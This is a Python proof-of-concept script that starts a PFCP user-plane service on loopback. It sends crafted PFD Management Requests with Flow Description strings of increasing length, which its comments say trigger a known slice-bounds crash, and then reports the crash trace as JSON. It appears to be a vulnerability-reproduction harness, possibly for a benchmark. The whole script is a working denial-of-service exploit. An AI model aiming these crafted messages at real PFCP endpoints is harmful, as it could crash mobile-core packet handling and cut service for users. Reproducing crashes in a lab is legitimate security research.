#!/usr/bin/env python3
"""Single-file PoC driver for the `upf` PFCP network service.

The script starts the target, waits for its loopback UDP listener, sends a
small bounded sequence of locally generated PFCP messages, observes the
result, terminates any surviving process, and reports a fixed JSON object.
"""

import argparse
import json
import os
import signal as _signal
import socket
import subprocess
import sys
import tempfile
import threading
import time

HOST = "127.0.0.1"
PORT = 8805
DEFAULT_TIMEOUT = 8.0

# ---------------------------------------------------------------------------
# PFCP message helpers (generated on the fly, standard library only)
# ---------------------------------------------------------------------------


def pfcp_ie(ie_type: int, payload: bytes) -> bytes:
    """Build a TLV-encoded PFCP IE from a numeric IE type and payload."""
    return ie_type.to_bytes(2, "big") + len(payload).to_bytes(2, "big") + payload


def pfcp_message(message_type: int, body: bytes, seq: int = 1,
                 s_flag: bool = False, seid: int = 0) -> bytes:
    """Build a PFCP message with the verified 8-byte header (plus SEID)."""
    header_len = 8 + (8 if s_flag else 0)
    total_len = header_len + len(body)
    out = bytearray()
    first = 0x20 | (0x01 if s_flag else 0x00)
    out.append(first)
    out.append(message_type)
    out += total_len.to_bytes(2, "big")
    if s_flag:
        out += (seid & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "big")
    out += (seq & 0xFFFFFF).to_bytes(3, "big")
    out.append(0)
    out += body
    return bytes(out)


def heartbeat_request(seq: int = 1) -> bytes:
    """Heartbeat Request carrying the mandatory Recovery Time Stamp IE."""
    recovery_ts = pfcp_ie(96, (1).to_bytes(4, "big"))
    return pfcp_message(1, recovery_ts, seq=seq)


def pfd_management_request(fd: bytes, seq: int = 2) -> bytes:
    """PFD Management Request.

    The nested structure is Application IDs/PFDs (58) -> Application ID (24)
    and PFD Context (59) -> PFD Contents (61).  In the target build, a PFD
    Contents IE with the Flow Description flag set and a small malicious
    Flow Description string exercises a known slice-bounds defect.
    """
    app_id = pfcp_ie(24, b"internet")
    pfd_contents = pfcp_ie(61, b"\x01" + len(fd).to_bytes(2, "big") + fd)
    pfd_context = pfcp_ie(59, pfd_contents)
    app_ids_pfds = pfcp_ie(58, app_id + pfd_context)
    return pfcp_message(3, app_ids_pfds, seq=seq)


def pfd_probe_messages():
    """Return a bounded, deterministic sequence of PFD probe messages.

    The Flow Description length is increased monotonically.  On the target
    build the first crashing candidate has length 4; earlier lengths parse
    or are cleanly rejected instead.
    """
    lengths = [0, 1, 2, 3, 4, 5, 6, 8, 12, 16, 24, 32, 48, 64]
    seq = 2
    for length in lengths:
        fd = (b"abcd" * ((length + 3) // 4))[:length]
        yield length, pfd_management_request(fd, seq=seq)
        seq += 1


# ---------------------------------------------------------------------------
# Process output capture
# ---------------------------------------------------------------------------


class RunningService:
    """Manage the target process and continuously capture its output."""

    def __init__(self, command):
        self.command = list(command)
        self.proc = subprocess.Popen(
            self.command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        self._stdout = b""
        self._stderr = b""
        self._lock = threading.Lock()
        self._threads = [
            threading.Thread(target=self._pump, args=(self.proc.stdout, True), daemon=True),
            threading.Thread(target=self._pump, args=(self.proc.stderr, False), daemon=True),
        ]
        for thread in self._threads:
            thread.start()
        self._terminated_by_driver = False

    def _pump(self, stream, is_stdout):
        while True:
            try:
                chunk = stream.read(65536)
            except (ValueError, OSError):
                break
            if not chunk:
                break
            with self._lock:
                if is_stdout:
                    self._stdout += chunk
                else:
                    self._stderr += chunk

    def stdout_text(self):
        with self._lock:
            data = self._stdout
        return data.decode("utf-8", "replace")

    def stderr_text(self):
        with self._lock:
            data = self._stderr
        return data.decode("utf-8", "replace")

    def poll(self):
        return self.proc.poll()

    def is_alive(self):
        return self.proc.poll() is None

    def wait(self, timeout=None):
        try:
            return self.proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            return None

    def shutdown(self, grace=3.0):
        """Idempotently ensure the target is no longer running."""
        if self.proc.poll() is None:
            self._terminated_by_driver = True
            try:
                self.proc.terminate()
            except OSError:
                pass
            try:
                self.proc.wait(timeout=grace)
            except subprocess.TimeoutExpired:
                try:
                    self.proc.kill()
                except OSError:
                    pass
                try:
                    self.proc.wait(timeout=grace)
                except subprocess.TimeoutExpired:
                    pass
        else:
            try:
                self.proc.wait(timeout=0.2)
            except (subprocess.TimeoutExpired, OSError):
                pass
        for thread in self._threads:
            thread.join(timeout=max(0.5, grace / 2))

    def terminated_by_driver(self):
        return self._terminated_by_driver


def signal_name(returncode):
    """POSIX signal name for a negative subprocess return code, else None."""
    if returncode is None or returncode >= 0:
        return None
    try:
        return _signal.Signals(-returncode).name
    except (ValueError, OSError):
        return "SIG" + str(-returncode)


# ---------------------------------------------------------------------------
# Configuration and local-loopback networking
# ---------------------------------------------------------------------------


def write_config(directory, timeout):
    read_timeout = max(15, int(timeout) + 5)
    config = {
        "mode": "af_packet",
        "access": {"ifname": "lo"},
        "core": {"ifname": "lo"},
        "cpiface": {"hostname": "", "http_port": "0", "dnn": "internet"},
        "n4_addr": HOST,
        "resp_timeout": "2s",
        "read_timeout": read_timeout,
        "log_level": "info",
    }
    path = os.path.join(directory, "upf.jsonc")
    with open(path, "w", encoding="utf-8") as handle:
        json.dump(config, handle, indent=2)
    return path


def open_probe_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((HOST, 0))
    return sock


def send_and_recv_one(sock, message, recv_timeout=0.35):
    """Send one datagram and try to collect one immediate UDP reply."""
    replies = []
    sock.sendto(message, (HOST, PORT))
    sock.settimeout(recv_timeout)
    try:
        reply, _ = sock.recvfrom(65535)
        replies.append(reply)
    except socket.timeout:
        pass
    except OSError as exc:
        if exc.errno not in (11,):
            raise
    return replies


# ---------------------------------------------------------------------------
# Evidence normalisation
# ---------------------------------------------------------------------------


def empty_result(binary):
    return {
        "binary": binary,
        "command": [],
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {
            "kind": "protocol_transcript",
            "value": "no_response",
            "path": None,
        },
        "error": None,
    }


def observable_for_exit(service):
    """Return appropriate observable evidence for an already-reaped process."""
    stdout = service.stdout_text()
    stderr = service.stderr_text()
    trace = stderr if "panic:" in stderr else stdout
    return {
        "kind": "crash_trace",
        "value": trace,
        "path": None,
    }


# ---------------------------------------------------------------------------
# Main driver
# ---------------------------------------------------------------------------


def run_poc(binary: str, timeout: float) -> dict:
    result = empty_result(binary)
    start_time = time.monotonic()

    tmpdir = tempfile.mkdtemp(prefix="upf-poc-")
    service = None
    probe_sock = None
    heartbeat_hex = None

    try:
        config_path = write_config(tmpdir, timeout)
        command = [binary, "-config", config_path]
        result["command"] = command
        service = RunningService(command)

        deadline = start_time + min(timeout, 12.0)
        ready = False
        last_alive_check = service.is_alive()

        # Prove readiness with loopback heartbeat attempts until the deadline.
        probe_sock = open_probe_socket()
        while time.monotonic() < deadline:
            if not service.is_alive():
                break
            if b"listening for new PFCP connections" in service.stdout_text().encode("utf-8", "replace"):
                ready = True
                break
            replies = send_and_recv_one(probe_sock, heartbeat_request(seq=1))
            if replies:
                heartbeat_hex = replies[0].hex()
                ready = True
                break
            time.sleep(0.1)

        if service.poll() is not None:
            # The service left on its own; capture that outcome faithfully.
            was_ready = ready or service.stdout_text() and (
                "listening for new PFCP connections" in service.stdout_text()
            )
            _ = was_ready
            service.shutdown()
        elif not ready:
            # No listener became ready in the window.
            service.shutdown()
            result["timed_out"] = True
            result["error"] = "listener did not become ready on %s:%d" % (HOST, PORT)
        else:
            # Send bounded, deterministic PFD probes; detect first crash.
            discovered = None
            for length, message in pfd_probe_messages():
                if time.monotonic() - start_time >= timeout:
                    break
                send_and_recv_one(probe_sock, message, recv_timeout=0.15)
                # Give the target a moment to process and possibly panic.
                wait_until = time.monotonic() + 0.30
                while time.monotonic() < wait_until:
                    if service.poll() is not None:
                        break
                    time.sleep(0.02)
                if service.poll() is not None:
                    discovered = (length, message)
                    break

            # Observe until the end of the observation window unless the
            # target has already exited.
            if service.poll() is None:
                remaining = timeout - (time.monotonic() - start_time)
                while remaining > 0 and service.poll() is None:
                    time.sleep(min(0.05, remaining))
                    remaining = timeout - (time.monotonic() - start_time)

            if service.poll() is not None:
                # Abnormal termination observed (or a clean self-exit).
                service.shutdown()
            else:
                # Still running: the driver must terminate it.
                service.shutdown()
                result["timed_out"] = True

            # Store the normal protocol transcript for a non-crashing run.
            transcript_value = heartbeat_hex if heartbeat_hex else "no_response"
            if service.poll() is not None and (
                service.proc.returncode != 0 or signal_name(service.proc.returncode) is not None
            ):
                result["observable"] = observable_for_exit(service)
            else:
                result["observable"] = {
                    "kind": "protocol_transcript",
                    "value": transcript_value,
                    "path": None,
                }
    except Exception as exc:  # genuine driver failure
        result["error"] = "driver exception: %s" % exc
    finally:
        if probe_sock is not None:
            try:
                probe_sock.close()
            except OSError:
                pass
        if service is not None:
            service.shutdown()

    # Reap any process that has exited and capture full output.
    if service is not None:
        stdout = service.stdout_text()
        stderr = service.stderr_text()
        returncode = service.poll()
        if returncode is None:
            service.wait(timeout=5)
            returncode = service.poll()
        result["stdout"] = stdout
        result["stderr"] = stderr
        result["returncode"] = returncode
        if result["timed_out"]:
            result["signal"] = None
        else:
            result["signal"] = signal_name(returncode)

        # If the process exited abnormally without an earlier observable
        # decision (e.g. startup crash), record the trace.
        if result["error"] is None and returncode is not None:
            abnormal = returncode != 0 or signal_name(returncode) is not None
            if abnormal and result["observable"]["kind"] != "crash_trace":
                result["observable"] = {
                    "kind": "crash_trace",
                    "value": stderr if "panic:" in stderr else stdout,
                    "path": None,
                }
            elif not abnormal and returncode == 0 and result["observable"]["kind"] == "crash_trace":
                # A clean self-exit is not an abnormal termination.
                result["observable"] = {
                    "kind": "protocol_transcript",
                    "value": heartbeat_hex if heartbeat_hex else "no_response",
                    "path": None,
                }

    try:
        # Best-effort cleanup of the temporary directory.
        for name in os.listdir(tmpdir):
            os.remove(os.path.join(tmpdir, name))
        os.rmdir(tmpdir)
    except OSError:
        pass

    result["runtime_ms"] = int((time.monotonic() - start_time) * 1000)
    return result


def parse_args(argv):
    parser = argparse.ArgumentParser(description="PoC driver for the upf network service")
    parser.add_argument("--binary", required=True, help="path to the target binary")
    parser.add_argument("--json-out", default=None, help="write JSON result to this file")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT,
                        help="observation window in seconds (default: %.1f)" % DEFAULT_TIMEOUT)
    return parser.parse_args(argv)


def main(argv=None):
    args = parse_args(argv if argv is not None else sys.argv[1:])
    binary = args.binary
    binary_abs = os.path.abspath(binary)

    if not os.path.isfile(binary_abs):
        result = empty_result(binary)
        result["error"] = "binary not found: %s" % binary
    elif not os.access(binary_abs, os.X_OK):
        result = empty_result(binary)
        result["error"] = "binary is not executable: %s" % binary
    else:
        result = run_poc(binary_abs, max(0.5, args.timeout))

    serialized = json.dumps(result, ensure_ascii=False, indent=2)
    if args.json_out:
        out_dir = os.path.dirname(os.path.abspath(args.json_out))
        if out_dir and not os.path.isdir(out_dir):
            os.makedirs(out_dir, exist_ok=True)
        with open(args.json_out, "w", encoding="utf-8") as handle:
            handle.write(serialized)
            handle.write("\n")
    else:
        print(serialized)
    return 0


if __name__ == "__main__":
    sys.exit(main())
